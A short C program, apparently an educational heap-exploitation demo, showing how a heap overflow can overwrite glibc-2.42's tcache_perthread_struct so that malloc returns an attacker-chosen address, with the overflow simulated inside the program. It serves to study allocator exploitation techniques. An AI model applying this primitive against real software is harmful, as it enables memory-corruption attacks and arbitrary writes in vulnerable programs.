#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	// disable buffering so _IO_FILE does not interfere with our heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// introduction
	puts("This file demonstrates an interesting feature of glibc-2.42: the `tcache_perthread_struct`");
	puts("may not be at the top of the heap, which makes it easy to turn a heap overflow into arbitrary allocation.\n");


	puts("In the past, before using the heap, libc will initialize tcache using `MAYBE_INIT_TCACHE`.");
	puts("But this patch removes the call in the non-tcache path: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=cbfd7988107b27b9ff1d0b57fa2c8f13a932e508");
	puts("As a result, we can put many large chunks before tcache_perthread_struct");
	puts("and use a heap overflow primitive (or chunk overlapping) to hijack `tcache_perthread_struct`\n");

	long target[0x4] __attribute__ ((aligned (0x10)));

	long *chunk = malloc(0x420);
	printf("first, allocate a large chunk at the top of the heap: %p\n", chunk);
	void *p1 = malloc(0x10);
	free(p1);
	printf("now, allocate a chunk and free it to initialize tcache_perthread_struct and put it right before our chunk\n");
	printf("the tcache_perthread_struct->tcache_entry[0] should be initialized with %p\n", p1);

	printf("Now, we simulate an overflow vulnerability to overwrite the pointer\n");
	/*Vulnerability*/
	chunk[0x420/8+25] = (long)&target[0];
	/*Vulnerability*/

	void *p2 = malloc(0x10);
	printf("Then the next allocation will be at our wanted address: %p\n", p2);
	assert(p2 == &target[0]);
}
